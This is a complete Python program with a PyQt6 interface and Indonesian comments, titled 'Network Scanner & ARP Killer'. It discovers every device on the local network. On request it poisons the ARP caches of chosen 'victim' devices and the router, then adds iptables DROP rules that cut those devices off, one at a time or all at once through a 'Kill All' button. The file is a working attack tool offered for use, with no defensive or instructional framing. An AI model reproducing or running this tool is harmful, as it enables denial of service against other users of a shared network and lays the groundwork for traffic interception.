#!/usr/bin/env python3
# linux ubuntu
# sudo /home/whoami/anaconda3/envs/venv2/bin/python 3.py
import sys
import subprocess
import re
import threading
import time
from typing import List, Dict, Optional
from dataclasses import dataclass

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
    QWidget, QPushButton, QTableWidget, QTableWidgetItem,
    QLabel, QLineEdit, QTextEdit, QGroupBox, QCheckBox,
    QMessageBox, QProgressBar, QSplitter, QHeaderView
)
from PyQt6.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt6.QtGui import QFont, QColor

try:
    from scapy.all import *
except ImportError:
    print("Error: Scapy tidak terinstall. Install dengan: pip install scapy")
    sys.exit(1)

@dataclass
class Device:
    ip: str
    mac: str
    admin: bool = False
    
    def __eq__(self, other):
        return isinstance(other, Device) and self.mac == other.mac

class NetworkInterface:
    def __init__(self, name: str):
        self.name = name

def get_default_iface():
    """Mendapatkan interface default."""
    try:
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith('default'):
                parts = line.split()
                iface_name = parts[4] if len(parts) > 4 else 'eth0'
                return NetworkInterface(iface_name)
    except Exception:
        return NetworkInterface('eth0')
    return NetworkInterface('NULL')

def get_my_ip():
    """Mendapatkan IP address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'addr', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'inet ' in line and 'inet6' not in line:
                ip = line.strip().split()[1].split('/')[0]
                return ip
    except Exception as e:
        print(f"Error getting my IP: {e}")
    return None

def get_my_mac():
    """Mendapatkan MAC address komputer ini."""
    try:
        iface = get_default_iface()
        result = subprocess.run(['ip', 'link', 'show', iface.name], 
                              capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'link/ether' in line:
                mac = line.strip().split()[1]
                return mac
    except Exception as e:
        print(f"Error getting my MAC: {e}")
    return None

def enable_ip_forwarding():
    """Aktifkan IP forwarding."""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                      check=True, capture_output=True)
        print("[SYSTEM] IP forwarding enabled")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to enable IP forwarding: {e}")
        return False

def disable_ip_forwarding():
    """Nonaktifkan IP forwarding."""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                      check=True, capture_output=True)
        print("[SYSTEM] IP forwarding disabled")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to disable IP forwarding: {e}")

def threaded(func):
    """Decorator untuk menjalankan fungsi di thread terpisah."""
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

class Killer:
    def __init__(self, router=None):
        self.iface = get_default_iface()
        self.router = router
        self.killed = {}
        self.storage = {}
        self.running = True
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        
        # Enable IP forwarding
        enable_ip_forwarding()
        print(f"[INFO] My IP: {self.my_ip}, My MAC: {self.my_mac}")

    def add_iptables_drop(self, ip):
        """Tambahkan rule iptables untuk DROP traffic dari IP"""
        try:
            # Drop packets being forwarded from victim
            cmd = ["iptables", "-A", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            
            # Drop packets being forwarded to victim  
            cmd = ["iptables", "-A", "FORWARD", "-d", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True)
            
            print(f"[IPTABLES] Added DROP rules for {ip}")
        except subprocess.CalledProcessError as e:
            print(f"[IPTABLES ERROR] Failed to add rule for {ip}: {e}")

    def remove_iptables_drop(self, ip):
        """Hapus rule iptables untuk DROP traffic dari IP"""
        try:
            cmd = ["iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
            
            cmd = ["iptables", "-D", "FORWARD", "-d", ip, "-j", "DROP"]
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
            
            print(f"[IPTABLES] Removed DROP rules for {ip}")
        except subprocess.CalledProcessError:
            pass  # Rule mungkin sudah tidak ada
    
    @threaded
    def kill(self, victim, wait_after=2):
        """Spoofing victim"""
        if not self.router:
            print("Router tidak ditemukan!")
            return
        
        # Jangan poison diri sendiri!
        if victim.ip == self.my_ip or victim.mac == self.my_mac:
            print(f"[WARNING] Skipping self: {victim.ip}")
            return
            
        if victim.mac in self.killed:
            print(f"{victim.mac} sudah di-kill.")
            return
        
        self.killed[victim.mac] = victim
        self.add_iptables_drop(victim.ip) 

        # Poison victim's ARP cache - buat victim pikir kita adalah router
        to_victim = ARP(
            op=2,  # is-at (ARP reply)
            psrc=self.router.ip,
            hwsrc=self.my_mac,  # MAC kita
            pdst=victim.ip,
            hwdst=victim.mac
        )

        # Poison router's ARP cache - buat router pikir kita adalah victim
        to_router = ARP(
            op=2,  # is-at (ARP reply)
            psrc=victim.ip,
            hwsrc=self.my_mac,  # MAC kita
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        print(f'[KILL] Started poisoning {victim.ip} ({victim.mac})')

        while (victim.mac in self.killed and 
               self.iface.name != 'NULL' and 
               self.running):
            try:
                send(to_victim, iface=self.iface.name, verbose=0)
                send(to_router, iface=self.iface.name, verbose=0)
                time.sleep(wait_after)
            except Exception as e:
                print(f"[ERROR] Error sending packets: {e}")
                break

        print(f'[UNKILL] Stopped poisoning {victim.mac}')

    @threaded
    def unkill(self, victim):
        """Unspoofing victim"""
        if victim.mac not in self.killed:
            return
            
        self.killed.pop(victim.mac, None)
        self.remove_iptables_drop(victim.ip)

        if not self.router:
            return

        # Restore victim's ARP cache dengan MAC yang benar
        to_victim = ARP(
            op=2,
            psrc=self.router.ip,
            hwsrc=self.router.mac,  # MAC router yang benar
            pdst=victim.ip,
            hwdst=victim.mac
        )

        # Restore router's ARP cache dengan MAC yang benar
        to_router = ARP(
            op=2,
            psrc=victim.ip,
            hwsrc=victim.mac,  # MAC victim yang benar
            pdst=self.router.ip,
            hwdst=self.router.mac
        )

        if self.iface.name != 'NULL':
            try:
                # Kirim beberapa kali untuk memastikan
                for _ in range(5):
                    send(to_victim, iface=self.iface.name, verbose=0)
                    send(to_router, iface=self.iface.name, verbose=0)
                    time.sleep(0.2)
                print(f'[FIX] Restored ARP for {victim.ip} ({victim.mac})')
            except Exception as e:
                print(f"[ERROR] Error fixing victim: {e}")

    def kill_all(self, device_list):
        """Kill semua device yang tidak admin"""
        for device in device_list[:]:
            if device.admin:
                continue
            # Skip diri sendiri
            if device.ip == self.my_ip or device.mac == self.my_mac:
                continue
            if device.mac not in self.killed:
                self.kill(device)

    def unkill_all(self):
        """Unkill semua device"""
        for mac in list(self.killed.keys()):
            device = self.killed[mac]
            self.unkill(device)

    def stop(self):
        """Stop killer"""
        self.running = False
        self.unkill_all()
        time.sleep(2)
        disable_ip_forwarding()
        
        # Clean up all iptables rules
        try:
            subprocess.run(['iptables', '-F', 'FORWARD'], check=True)
            print("[CLEANUP] Cleared iptables FORWARD chain")
        except:
            pass

class NetworkScanner(QThread):
    devices_found = pyqtSignal(list)
    progress_update = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.network = None
        self.gateway = None
        self.gateway_mac = None
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
    
    def get_network_info(self):
        """Mendapatkan informasi jaringan"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.startswith('default'):
                    parts = line.split()
                    self.gateway = parts[2]
                    iface = parts[4]
                    
                    # Get network range
                    result2 = subprocess.run(['ip', 'addr', 'show', iface], 
                                           capture_output=True, text=True)
                    for line2 in result2.stdout.splitlines():
                        if 'inet ' in line2:
                            ip_net = line2.strip().split()[1]
                            self.network = ip_net
                            return True
        except Exception as e:
            self.progress_update.emit(f"Error getting network info: {e}")
        return False
    
    def get_gateway_mac(self):
        """Mendapatkan MAC address gateway"""
        if not self.gateway:
            return None
        try:
            arp = ARP(pdst=self.gateway)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            result = srp(packet, timeout=10, verbose=0)[0]
            if result:
                return result[0][1].hwsrc
        except Exception:
            pass
        return None
    
    def run(self):
        """Menjalankan scan jaringan"""
        self.progress_update.emit("Mendapatkan informasi jaringan...")
        
        if not self.get_network_info():
            self.progress_update.emit("Gagal mendapatkan informasi jaringan")
            return
        
        self.progress_update.emit(f"Scanning jaringan: {self.network}")
        
        try:
            arp = ARP(pdst=self.network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=10, verbose=0)[0]
            
            devices = []
            for sent, received in result:
                # Tandai gateway dan diri sendiri
                is_gateway = (received.psrc == self.gateway)
                is_self = (received.psrc == self.my_ip or received.hwsrc == self.my_mac)
                
                device = Device(
                    ip=received.psrc,
                    mac=received.hwsrc,
                    admin=(is_gateway or is_self)
                )
                devices.append(device)
            
            # Get gateway MAC
            self.gateway_mac = self.get_gateway_mac()
            
            self.devices_found.emit(devices)
            self.progress_update.emit(f"Ditemukan {len(devices)} device")
            
        except Exception as e:
            self.progress_update.emit(f"Error scanning: {e}")

class NetworkKillerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.devices = []
        self.killer = None
        self.scanner = NetworkScanner()
        self.gateway_device = None
        
        self.init_ui()
        self.setup_connections()
        
    def init_ui(self):
        self.setWindowTitle("Network Scanner & ARP Killer")
        self.setGeometry(100, 100, 1000, 700)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        
        # Control panel
        control_group = QGroupBox("Control Panel")
        control_layout = QHBoxLayout(control_group)
        
        # Tombol dengan ukuran lebih besar dan warna custom
        self.scan_btn = QPushButton("Scan Network")
        self.scan_btn.setMinimumHeight(50)
        self.scan_btn.setMinimumWidth(150)
        
        self.kill_all_btn = QPushButton("Kill All")
        self.kill_all_btn.setMinimumHeight(50)
        self.kill_all_btn.setMinimumWidth(120)
        self.kill_all_btn.setEnabled(False)
        
        self.unkill_all_btn = QPushButton("Unkill All")
        self.unkill_all_btn.setMinimumHeight(50)
        self.unkill_all_btn.setMinimumWidth(120)
        self.unkill_all_btn.setEnabled(False)
        
        control_layout.addWidget(self.scan_btn)
        control_layout.addWidget(self.kill_all_btn)
        control_layout.addWidget(self.unkill_all_btn)
        control_layout.addStretch()
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        
        # Status label
        self.status_label = QLabel("Ready to scan network")
        
        # Splitter for tables and logs
        splitter = QSplitter(Qt.Orientation.Vertical)
        
        # Device table
        device_group = QGroupBox("Network Devices")
        device_layout = QVBoxLayout(device_group)
        
        self.device_table = QTableWidget()
        self.device_table.setColumnCount(4)
        self.device_table.setHorizontalHeaderLabels(["IP Address", "MAC Address", "Status", "Action"])
        
        # Set column widths
        header = self.device_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        # Set row height lebih besar untuk tampung tombol yang lebih besar
        self.device_table.verticalHeader().setDefaultSectionSize(45)
        
        device_layout.addWidget(self.device_table)
        
        # Log area
        log_group = QGroupBox("Log")
        log_layout = QVBoxLayout(log_group)
        
        self.log_text = QTextEdit()
        self.log_text.setMaximumHeight(150)
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        # Add to splitter
        splitter.addWidget(device_group)
        splitter.addWidget(log_group)
        splitter.setSizes([400, 150])
        
        # Add to main layout
        layout.addWidget(control_group)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.status_label)
        layout.addWidget(splitter)
        
        # Style dengan warna custom
        self.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #cccccc;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QPushButton {
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                opacity: 0.9;
            }
            QPushButton:pressed {
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                opacity: 0.5;
            }
        """)
        
        # Style individual untuk setiap tombol
        self.scan_btn.setStyleSheet("""
            QPushButton {
                background-color: #9b59b6;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #8e44ad;
            }
            QPushButton:pressed {
                background-color: #7d3c98;
                padding-top: 12px;
                padding-bottom: 8px;
            }
        """)
        
        self.kill_all_btn.setStyleSheet("""
            QPushButton {
                background-color: #e74c3c;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #c0392b;
            }
            QPushButton:pressed {
                background-color: #a93226;
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                background-color: #e74c3c;
                opacity: 0.5;
            }
        """)
        
        self.unkill_all_btn.setStyleSheet("""
            QPushButton {
                background-color: #27ae60;
                color: white;
                padding: 10px;
                border-radius: 6px;
                border: none;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #229954;
            }
            QPushButton:pressed {
                background-color: #1e8449;
                padding-top: 12px;
                padding-bottom: 8px;
            }
            QPushButton:disabled {
                background-color: #27ae60;
                opacity: 0.5;
            }
        """)
    def setup_connections(self):
        self.scan_btn.clicked.connect(self.start_scan)
        self.kill_all_btn.clicked.connect(self.kill_all_devices)
        self.unkill_all_btn.clicked.connect(self.unkill_all_devices)
        
        self.scanner.devices_found.connect(self.update_device_table)
        self.scanner.progress_update.connect(self.update_status)
        self.scanner.finished.connect(self.scan_finished)
    
    def log_message(self, message):
        """Menambahkan pesan ke log"""
        self.log_text.append(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def update_status(self, message):
        """Update status label"""
        self.status_label.setText(message)
        self.log_message(message)
    
    def start_scan(self):
        """Memulai scan jaringan"""
        self.scan_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)
        self.device_table.setRowCount(0)
        self.devices.clear()
        
        self.scanner.start()
    
    def scan_finished(self):
        """Scan selesai"""
        self.scan_btn.setEnabled(True)
        self.progress_bar.setVisible(False)
        
        if self.devices:
            self.kill_all_btn.setEnabled(True)
            self.unkill_all_btn.setEnabled(True)
            
            if self.gateway_device:
                self.killer = Killer(self.gateway_device)
                self.log_message(f"Killer initialized with gateway: {self.gateway_device.ip}")
    
    def update_device_table(self, devices):
        """Update tabel device"""
        self.devices = devices
        self.device_table.setRowCount(len(devices))
        
        my_ip = get_my_ip()
        my_mac = get_my_mac()
        
        for i, device in enumerate(devices):
            ip_item = QTableWidgetItem(device.ip)
            self.device_table.setItem(i, 0, ip_item)
            
            mac_item = QTableWidgetItem(device.mac)
            self.device_table.setItem(i, 1, mac_item)
            
            # Status
            if device.ip == my_ip or device.mac == my_mac:
                status_item = QTableWidgetItem("This Computer")
                status_item.setBackground(QColor(0, 255, 0, 100))  # Green
            elif device.admin:
                status_item = QTableWidgetItem("Gateway/Router")
                status_item.setBackground(QColor(255, 255, 0, 100))  # Yellow
                self.gateway_device = device
            else:
                status_item = QTableWidgetItem("Device")
            
            self.device_table.setItem(i, 2, status_item)
            
            # Action buttons - LEBIH BESAR
            if not device.admin:
                action_widget = QWidget()
                action_layout = QHBoxLayout(action_widget)
                action_layout.setContentsMargins(5, 2, 5, 2)
                
                kill_btn = QPushButton("Kill")
                kill_btn.setMinimumHeight(35)
                kill_btn.setMinimumWidth(80)
                kill_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #e74c3c;
                        color: white;
                        padding: 5px;
                        border-radius: 4px;
                        border: none;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background-color: #c0392b;
                    }
                    QPushButton:pressed {
                        background-color: #a93226;
                    }
                """)
                kill_btn.clicked.connect(lambda checked, d=device: self.kill_device(d))
                
                unkill_btn = QPushButton("Unkill")
                unkill_btn.setMinimumHeight(35)
                unkill_btn.setMinimumWidth(80)
                unkill_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #27ae60;
                        color: white;
                        padding: 5px;
                        border-radius: 4px;
                        border: none;
                        font-weight: bold;
                    }
                    QPushButton:hover {
                        background-color: #229954;
                    }
                    QPushButton:pressed {
                        background-color: #1e8449;
                    }
                """)
                unkill_btn.clicked.connect(lambda checked, d=device: self.unkill_device(d))
                
                action_layout.addWidget(kill_btn)
                action_layout.addWidget(unkill_btn)
                action_layout.addStretch()
                
                self.device_table.setCellWidget(i, 3, action_widget)
            else:
                protected_item = QTableWidgetItem("Protected")
                self.device_table.setItem(i, 3, protected_item)

    
    def kill_device(self, device):
        """Kill satu device"""
        if self.killer:
            self.killer.kill(device)
            self.log_message(f"Killing device: {device.ip} ({device.mac})")
            self.update_device_status(device, "KILLED")
    
    def unkill_device(self, device):
        """Unkill satu device"""
        if self.killer:
            self.killer.unkill(device)
            self.log_message(f"Unkilling device: {device.ip} ({device.mac})")
            self.update_device_status(device, "Active")
    
    def kill_all_devices(self):
        """Kill semua device non-admin"""
        if not self.killer:
            QMessageBox.warning(self, "Warning", "Killer tidak diinisialisasi. Scan network terlebih dahulu.")
            return
        
        reply = QMessageBox.question(
            self, 'Konfirmasi', 
            'Yakin ingin kill semua device?\nIni akan memutus koneksi internet mereka.',
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            non_admin_devices = [d for d in self.devices if not d.admin]
            self.killer.kill_all(non_admin_devices)
            self.log_message(f"Killing {len(non_admin_devices)} devices...")
            
            for device in non_admin_devices:
                self.update_device_status(device, "KILLED")
    
    def unkill_all_devices(self):
        """Unkill semua device"""
        if not self.killer:
            return
        
        self.killer.unkill_all()
        self.log_message("Unkilling all devices...")
        
        for device in self.devices:
            if not device.admin:
                self.update_device_status(device, "Active")
    
    def update_device_status(self, target_device, status):
        """Update status device di tabel"""
        for i in range(self.device_table.rowCount()):
            ip_item = self.device_table.item(i, 0)
            if ip_item and ip_item.text() == target_device.ip:
                status_item = self.device_table.item(i, 2)
                if status_item and not target_device.admin:
                    status_item.setText(status)
                    if status == "KILLED":
                        status_item.setBackground(QColor(255, 0, 0, 100))
                    else:
                        status_item.setBackground(QColor(0, 0, 0, 0))
                break
    
    def closeEvent(self, event):
        """Handle aplikasi ditutup"""
        if self.killer:
            self.log_message("Stopping killer and restoring connections...")
            self.killer.stop()
            time.sleep(2)
        
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Check if running as root
    if os.geteuid() != 0:
        QMessageBox.critical(
            None, "Error", 
            "Aplikasi ini memerlukan hak akses root.\n"
            "Jalankan dengan: sudo python3 network_killer.py"
        )
        sys.exit(1)
    
    window = NetworkKillerGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    import os
    main()
